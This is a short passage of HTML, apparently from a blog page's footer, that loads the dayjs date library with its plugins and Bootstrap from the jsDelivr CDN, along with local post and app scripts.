src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
